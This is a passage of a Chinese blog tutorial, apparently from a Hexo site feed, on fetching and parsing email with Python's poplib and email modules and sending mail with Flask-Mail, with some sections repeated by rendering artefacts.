class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="3-POP3收取邮件"><a href="#3-POP3收取邮件" class="headerlink" title="3.POP3收取邮件"></a>3.POP3收取邮件</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h3><blockquote><p>POP是指邮局协议，目的是让用户可以访问邮箱服务器中的邮件，允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的</p></blockquote><h3 id="2-函数"><a href="#2-函数" class="headerlink" title="2.函数"></a>2.函数</h3><blockquote><p>python提供了poplib模块来支持pop3<br>收取邮件的过程</p><ol><li>连接pop3服务器 (poplib.POP3.<strong>init</strong>)</li><li>发送用户名和密码进行验证 (poplib.POP3.user poplib.POP3.pass_)</li><li>获取邮箱中信件信息 (poplib.POP3.stat)</li><li>收取邮件 (poplib.POP3.retr)</li><li>删除邮件 (poplib.POP3.dele)</li><li>退出 (poplib.POP3.quit)</li></ol></blockquote><h4 id="1-函数方法"><a href="#1-函数方法" class="headerlink" title="1.函数方法"></a>1.函数方法</h4><blockquote><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>POP3(server)</td><td>实例化POP3对象，server是pop服务器地址</td></tr><tr><td>user(username)</td><td>发送用户名到服务器，等待服务器返回消息</td></tr><tr><td>pass_(password)</td><td>发送密码</td></tr><tr><td>stat()</td><td>返回邮箱的状态，返回2元组(消息的数量，消息的总字节数目)–&gt;邮件总数，总字节数</td></tr><tr><td>list([msgnum])</td><td>stat()的扩展，返回一个3元组(返回信息，消息列表，消息的大小)，如果指定msgnum，就只返回指定消息的数据 —返回邮件数量和每个邮件的大小</td></tr><tr><td>retr(msgnum)</td><td>获取详细的msgnum，设置为已读，返回3元组(返回信息, 消息msgnum的所以内容, 消息的字节数)，如果指定msgnum，就只返回指定消息的数据—返回由参数标识的邮件的全部文本</td></tr><tr><td>dele(msgnum)</td><td>将指定消息标记为删除</td></tr><tr><td>quit()</td><td>登出，保存修改，解锁邮箱，结束连接，退出</td></tr><tr><td>top()</td><td>服务器返回由参数标识的邮件前n行内容，n必须是整数</td></tr><tr><td>noop()</td><td>服务器返回一个肯定的相应</td></tr><tr><td>uidl</td><td>返回邮件的唯一标识符，pop3回话的每个标识符都是唯一的</td></tr><tr><td>apop(name,digest)</td><td>digest是md5消息摘要</td></tr></tbody></table></blockquote><h4 id="2-接收邮件"><a href="#2-接收邮件" class="headerlink" title="2.接收邮件"></a>2.接收邮件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span>  poplib <span class="token keyword">import</span> POP3<span class="token comment" spellcheck="true">#pop3服务器地址</span>host <span class="token operator">=</span> <span class="token string">'pop3.163.com'</span><span class="token comment" spellcheck="true">#用户名</span>username <span class="token operator">=</span> <span class="token string">'xxx@163.com'</span><span class="token comment" spellcheck="true">#密码</span>password <span class="token operator">=</span> <span class="token string">'xxx'</span><span class="token comment" spellcheck="true">#创建一个pop3对象，这个时候已经连接上服务器了</span>pp <span class="token operator">=</span> POP3<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置调试模式</span>pp<span class="token punctuation">.</span>set_debuglevel<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#向服务器发送用户名</span>pp<span class="token punctuation">.</span>user<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#向服务器发送密码</span>pp<span class="token punctuation">.</span>pass_<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获取服务器上信件信息，返回时一个列表，第一项是一共有多少邮件，第二项是有多少字节</span>ret <span class="token operator">=</span> pp<span class="token punctuation">.</span>stat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 需要取出所有信件的头部，信件id是从1开始的</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#去除信件头部，注意：top指定的行数是以信件头为基数的，也就是说当取0行</span>    <span class="token comment" spellcheck="true">#其实是返回头部信息，取一行其实是返回头部信息之外再多1行 </span>   <span class="token triple-quoted-string string">"""      POP3.top(which, howmuch)        Retrieves the message header plus howmuch lines of the message after the header of message number which. Result is in form (response, ['line', ...], octets).    The POP3 TOP command this method uses, unlike the RETR command, doesn’t set the message’s seen flag; unfortunately, TOP is poorly specified in the RFCs and is frequently broken in off-brand servers. Test this method by hand against the POP3 servers you will use before trusting it.   which：表示的是第几封信   howmuch: 指的是头部以后的第几行   """</span>   mlist <span class="token operator">=</span> pp<span class="token punctuation">.</span>top<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'line:'</span> <span class="token punctuation">,</span>len<span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#取出第一份邮件的头部</span>mlist <span class="token operator">=</span> pp<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'line0:'</span><span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'line1:'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#这份邮件的状态。邮件总字节数</span><span class="token keyword">print</span><span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#邮件头内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>mlist<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#邮件头字节数</span><span class="token keyword">print</span><span class="token punctuation">(</span>mlist<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#列出服务器上邮件信息，这个会对没一封邮件都输出id和大小， stat输出的是总的统计信息</span>ret <span class="token operator">=</span> pp<span class="token punctuation">.</span>list<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 取第一封邮件完整信息，在返回值里，是按行存储在down[1]的列表里的。down[0]是返回的状态信息</span><span class="token triple-quoted-string string">"""POP3.retr(which)Retrieve whole message number which, and set its seen flag. Result is in form (response, ['line', ...], octets)."""</span>down <span class="token operator">=</span> pp<span class="token punctuation">.</span>retr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'lines:'</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>down<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出邮件,按行存在down[1]中，打印出每一行</span><span class="token keyword">for</span> line <span class="token keyword">in</span> down<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#退出</span>pp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果需要安全邮件，则是对pop3做了ssl加密，这样要使用POP3_SSL类</p><pre class="line-numbers language-python">pp = poplib.POP3_SSL(host,port=x)</code></pre></blockquote><h4 id="3-收取邮件并使用smtp解析"><a href="#3-收取邮件并使用smtp解析" class="headerlink" title="3.收取邮件并使用smtp解析"></a>3.收取邮件并使用smtp解析</h4><blockquote><p>解析邮件很容易</p><pre><code class="python"><code class="language-python">pp = poplib.POP3_SSL(host,port=x)</code></pre></blockquote><h4 id="3-收取邮件并使用smtp解析"><a href="#3-收取邮件并使用smtp解析" class="headerlink" title="3.收取邮件并使用smtp解析"></a>3.收取邮件并使用smtp解析</h4><blockquote><p>解析邮件很容易</p><pre><code class="python">import emailfrom email.parser import Parserfrom email.header import decode_headerfrom email.utils  import parseaddrimport poplib# pop3服务器地址host = 'pop3.163.com'#用户名username = 'xxx@163.com'#密码password = 'xxx'#创建一个pop3对象，这个时候已经连接上服务器server = poplib.POP3(host)# 设置调试模式server.set_debuglevel(1)# 登录server.user(username)server.pass_(password)#stat()返回二元组(邮件总数，邮件总字节数)print('Messages: %s. Size: %s' % server.stat())# list()返回3元组(消息状态，[每个邮件编号和大小]，消息的字节数)resp, mails, octets = server.list()# 获取最新一封邮件, 注意索引号从1开始:resp, lines, octets = server.retr(len(mails))# 解析邮件msg = Parser().parsestr('\r\n'.join(lines))# 打印邮件内容:print_info(msg)# 慎重:将直接从服务器删除邮件:# server.dele(len(mails))# 关闭连接:server.quit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是Message对象本省可能是一个MIMEMultipart对象，即包含其他MIMEBase对象，嵌套可能还不止一层。所以我们要递归的打印出Message对象的层次结构：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> poplib<span class="token keyword">import</span> email<span class="token keyword">from</span> email<span class="token punctuation">.</span>parser <span class="token keyword">import</span> Parser<span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> decode_header<span class="token keyword">from</span> email<span class="token punctuation">.</span>utils <span class="token keyword">import</span> parseaddr<span class="token keyword">def</span> <span class="token function">guess_charset</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>   charset <span class="token operator">=</span> msg<span class="token punctuation">.</span>get_charset<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> charset <span class="token keyword">is</span> None<span class="token punctuation">:</span>       content_type <span class="token operator">=</span> msg<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>       pos <span class="token operator">=</span> content_type<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'charset='</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> pos <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>           charset <span class="token operator">=</span> content_type<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> charset<span class="token keyword">def</span> <span class="token function">decode_str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>   value<span class="token punctuation">,</span> charset <span class="token operator">=</span> decode_header<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token keyword">if</span> charset<span class="token punctuation">:</span>       value <span class="token operator">=</span> value<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>charset<span class="token punctuation">)</span>   <span class="token keyword">return</span> value<span class="token comment" spellcheck="true">#-------------------------------------------------------</span><span class="token comment" spellcheck="true">#递归的打印出message对象的层次结构(可能不止一层)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">def</span> <span class="token function">print_info</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#indent用于缩进显示</span>   <span class="token keyword">if</span> indent <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#邮件的From,To,Subject存在于根对象上</span>       <span class="token keyword">for</span> header <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">,</span> <span class="token string">'To'</span><span class="token punctuation">,</span> <span class="token string">'Subject'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>           value <span class="token operator">=</span> msg<span class="token punctuation">.</span>get<span class="token punctuation">(</span>header<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> value<span class="token punctuation">:</span>               <span class="token keyword">if</span> header<span class="token operator">==</span><span class="token string">'Subject'</span><span class="token punctuation">:</span>                   <span class="token comment" spellcheck="true">#需要解码Subject字符串</span>                   value <span class="token operator">=</span> decode_str<span class="token punctuation">(</span>value<span class="token punctuation">)</span>               <span class="token keyword">else</span><span class="token punctuation">:</span>                   <span class="token comment" spellcheck="true">#需要解码Email地址</span>                   hdr<span class="token punctuation">,</span> addr <span class="token operator">=</span> parseaddr<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                   name <span class="token operator">=</span> decode_str<span class="token punctuation">(</span>hdr<span class="token punctuation">)</span>                   value <span class="token operator">=</span> u<span class="token string">'%s &lt;%s>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s%s: %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">*</span> indent<span class="token punctuation">,</span> header<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>is_multipart<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#如果邮件对象是一个MIMEMultipart</span>       <span class="token comment" spellcheck="true">#get_payload()返回一个list，包含所有的子对象</span>       parts <span class="token operator">=</span> msg<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">for</span> n<span class="token punctuation">,</span> part <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%spart %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">*</span> indent<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s--------------------'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">*</span> indent<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#递归打印每一个子对象</span>           print_info<span class="token punctuation">(</span>part<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#邮件对象不是一个MIMEMultipart</span>       <span class="token comment" spellcheck="true"># 就根据content_type判断</span>       content_type <span class="token operator">=</span> msg<span class="token punctuation">.</span>get_content_type<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> content_type<span class="token operator">==</span><span class="token string">'text/plain'</span> <span class="token operator">or</span> content_type<span class="token operator">==</span><span class="token string">'text/html'</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true">#纯文本或者html</span>           content <span class="token operator">=</span> msg<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span>decode<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#检查文本编码</span>           charset <span class="token operator">=</span> guess_charset<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>           <span class="token keyword">if</span> charset<span class="token punctuation">:</span>               content <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>charset<span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%sText: %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">*</span> indent<span class="token punctuation">,</span> content <span class="token operator">+</span> <span class="token string">'...'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true">#不是文本，作为附件处理</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%sAttachment: %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'  '</span> <span class="token operator">*</span> indent<span class="token punctuation">,</span> content_type<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="4-Flask-mail"><a href="#4-Flask-mail" class="headerlink" title="4.Flask mail"></a>4.<code>Flask mail</code></h2><blockquote><p>在<code>web</code>程序中,经常会使用到电子邮件,比如,用户的注册时发送的确认邮件,定期像用户发送广告,等等.<code>Flask-Mail</code>包装了<code>python</code>标准库<code>smtplib</code>,简化了<code>Flask</code>发送电子邮件的过程.</p><p>官网:<code>http://www.pythondoc.com/flask-mail/</code></p></blockquote><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><blockquote><pre class="line-numbers language-bash">$ pip install flask-mail</code></pre></blockquote><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>MAIL_SERVER</code></td><td>默认<code>localhost</code>,服务器名称/<code>ip</code></td></tr><tr><td><code>MAIL_PORT</code></td><td>默认25,服务器端口号</td></tr><tr><td><code>MAIL_USE_TLS</code></td><td>默认<code>False</code>,传输安全层加密</td></tr><tr><td><code>MAIL_USE_SSL</code></td><td>默认为 <code>False</code>,<code>SSL</code>加密</td></tr><tr><td><code>MAIL_DEBUG</code></td><td>调试支持,默认是Flask应用程序的调试状态</td></tr><tr><td><code>MAIL_USERNAME</code></td><td>发件人用户名</td></tr><tr><td><code>MAIL_PASSWORD</code></td><td>发件人密码</td></tr><tr><td><code>MAIL_DEFAULT_SENDER</code></td><td>默认发件人</td></tr><tr><td><code>MAIL_MAX_EMAILS</code></td><td>设置要一次发送的最大邮件个数</td></tr><tr><td><code>MAIL_SUPPRESS_SEND</code></td><td>默认是<code>app.testing</code></td></tr><tr><td><code>MAIL_ASCII_ATTACHMENTS</code></td><td><code>True</code>,则附件名称被转换为ASCII</td></tr></tbody></table></blockquote><h3 id="3-主要函数"><a href="#3-主要函数" class="headerlink" title="3.主要函数"></a>3.主要函数</h3><h4 id="1-Mail"><a href="#1-Mail" class="headerlink" title="1.Mail"></a>1.<code>Mail</code></h4><blockquote><p>它管理电子邮件消息的要求.类似如下</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>send()</code></td><td>发送<code>Message</code>类对象的内容</td></tr><tr><td><code>connect()</code></td><td>与邮件主机打开连接</td></tr><tr><td><code>send_message()</code></td><td>发送消息对象</td></tr></tbody></table></blockquote><h4 id="2-Message"><a href="#2-Message" class="headerlink" title="2.Message"></a>2.<code>Message</code></h4><blockquote><p>封装电子邮件,主要如下:</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>attach()</code></td><td>向消息添加附件,有如下参数:<code>filename</code>(名称),<code>connect_typre</code>(文件MIME类型),<code>data</code>(原始文件数据),<code>disposition</code>(内容处置)</td></tr><tr><td><code>add_recipient()</code></td><td>向消息添加另一个收件人</td></tr></tbody></table></blockquote><h3 id="4-发送邮件"><a href="#4-发送邮件" class="headerlink" title="4.发送邮件"></a>4.发送邮件</h3><blockquote><pre><code class="python"><code class="language-bash">$ pip install flask-mail</code></pre></blockquote><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>MAIL_SERVER</code></td><td>默认<code>localhost</code>,服务器名称/<code>ip</code></td></tr><tr><td><code>MAIL_PORT</code></td><td>默认25,服务器端口号</td></tr><tr><td><code>MAIL_USE_TLS</code></td><td>默认<code>False</code>,传输安全层加密</td></tr><tr><td><code>MAIL_USE_SSL</code></td><td>默认为 <code>False</code>,<code>SSL</code>加密</td></tr><tr><td><code>MAIL_DEBUG</code></td><td>调试支持,默认是Flask应用程序的调试状态</td></tr><tr><td><code>MAIL_USERNAME</code></td><td>发件人用户名</td></tr><tr><td><code>MAIL_PASSWORD</code></td><td>发件人密码</td></tr><tr><td><code>MAIL_DEFAULT_SENDER</code></td><td>默认发件人</td></tr><tr><td><code>MAIL_MAX_EMAILS</code></td><td>设置要一次发送的最大邮件个数</td></tr><tr><td><code>MAIL_SUPPRESS_SEND</code></td><td>默认是<code>app.testing</code></td></tr><tr><td><code>MAIL_ASCII_ATTACHMENTS</code></td><td><code>True</code>,则附件名称被转换为ASCII</td></tr></tbody></table></blockquote><h3 id="3-主要函数"><a href="#3-主要函数" class="headerlink" title="3.主要函数"></a>3.主要函数</h3><h4 id="1-Mail"><a href="#1-Mail" class="headerlink" title="1.Mail"></a>1.<code>Mail</code></h4><blockquote><p>它管理电子邮件消息的要求.类似如下</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>send()</code></td><td>发送<code>Message</code>类对象的内容</td></tr><tr><td><code>connect()</code></td><td>与邮件主机打开连接</td></tr><tr><td><code>send_message()</code></td><td>发送消息对象</td></tr></tbody></table></blockquote><h4 id="2-Message"><a href="#2-Message" class="headerlink" title="2.Message"></a>2.<code>Message</code></h4><blockquote><p>封装电子邮件,主要如下:</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>attach()</code></td><td>向消息添加附件,有如下参数:<code>filename</code>(名称),<code>connect_typre</code>(文件MIME类型),<code>data</code>(原始文件数据),<code>disposition</code>(内容处置)</td></tr><tr><td><code>add_recipient()</code></td><td>向消息添加另一个收件人</td></tr></tbody></table></blockquote><h3 id="4-发送邮件"><a href="#4-发送邮件" class="headerlink" title="4.发送邮件"></a>4.发送邮件</h3><blockquote><pre><code class="python">from flask import Flaskfrom flask_mail import Mail,Messageapp = Flask(__name__)# 2.配置 flask_mailapp.config.update({    'DEBUG':True,    'TEMPLATES_AUTO_RELOAD':True,    'MAIL_SERVER' : 'smtp.qq.com',    'MAIL_PORT': 465,    'MAIL_USERNAME' : '25@qq.com',    'MAIL_PASSWORD' : "im", # qq使用的验证码    'MAIL_USE_SSL':True,    'MAIL_USE_TLS':False})# 1.初始化mail = Mail(app)@app.route('/')def index():    # 3.构造Message类    # recipients 可以设置多个收件人,也可以通过 msg.add_recipient['xxx@xx.com']添加收件人    msg = Message('Test', sender='25@qq.com', recipients=['18@163.com'])    # 邮件可以包含主题,或者HTML    msg.body = "testing"    msg.html = "<b>testing</b>"    # 发送邮件    mail.send(msg)    return '发送邮件成功'if __name__ == '__main__':    app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行程序后,可以在收件人邮箱中验证</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-21/1603288294765-10321.png" alt="10321"></p></blockquote><h4 id="1-发送大量邮件"><a href="#1-发送大量邮件" class="headerlink" title="1.发送大量邮件"></a>1.发送大量邮件</h4><blockquote><p>有些时候需要一次性发送大量邮件,如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">with</span> mail<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">'...'</span>        subject <span class="token operator">=</span> <span class="token string">"hello, %s"</span> <span class="token operator">%</span> user<span class="token punctuation">.</span>name        msg <span class="token operator">=</span> Message<span class="token punctuation">(</span>recipients<span class="token operator">=</span><span class="token punctuation">[</span>user<span class="token punctuation">.</span>email<span class="token punctuation">]</span><span class="token punctuation">,</span>                      body<span class="token operator">=</span>message<span class="token punctuation">,</span>                      subject<span class="token operator">=</span>subject<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-添加附件"><a href="#2-添加附件" class="headerlink" title="2.添加附件"></a>2.添加附件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">with</span> app<span class="token punctuation">.</span>open_resource<span class="token punctuation">(</span><span class="token string">"image.png"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">"image.png"</span><span class="token punctuation">,</span> <span class="token string">"image/png"</span><span class="token punctuation">,</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> FlaskMail </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask上下文</title>
      <link href="/posts/42964.html"/>
      <url>/posts/42964.html</url>
      
